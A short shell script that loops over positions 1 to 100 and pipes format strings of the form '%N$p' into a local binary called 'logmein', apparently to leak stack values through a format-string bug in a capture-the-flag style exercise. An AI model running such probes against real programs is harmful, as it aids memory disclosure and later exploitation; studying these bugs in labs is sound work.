#!/bin/sh

for i in $(seq 1 100); do
    printf "\n\nTRY NUM : %%%d => \n" "$i"
    printf "%%%d\$p\n" "$i" | ./logmein
done
